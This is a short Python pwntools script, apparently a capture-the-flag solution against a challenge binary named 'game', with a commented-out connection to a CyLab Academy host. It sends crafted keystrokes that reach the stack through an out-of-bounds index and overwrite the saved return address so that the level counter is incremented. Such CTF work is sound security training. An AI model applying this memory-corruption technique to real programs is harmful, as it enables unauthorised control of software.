from pwn import *

#p = remote('xebec.cylabacademy.net', 28932)
p = process('./game')


# Debugging code I used to figure out whether the saved EIP was overwritten

#gdb.attach(p, '''
#            break *0x0804968f if *(int*)($ebp+4) == 0x08049970
#            continue
#           ''')

# Change character to byte necessary to turn the eip 
# in move_player to the address of the level variable increment

p.send(b'l\x70')
auto_win = b'wwwaaaaawaaawdddddddds'

for i in range(4):
    p.sendline(auto_win + b'p')
p.sendline((b'ddddp'))

# Get to the stack at -51 (y, x) = (-1, 39) using the index formula
# index = y * 90 + x
 
p.sendline((b'w' * 29) + (b'a' * 50) + b'w')
p.sendline(auto_win)
p.sendline(b'd' * 19)
p.sendline(b'l\xfew')


p.interactive()
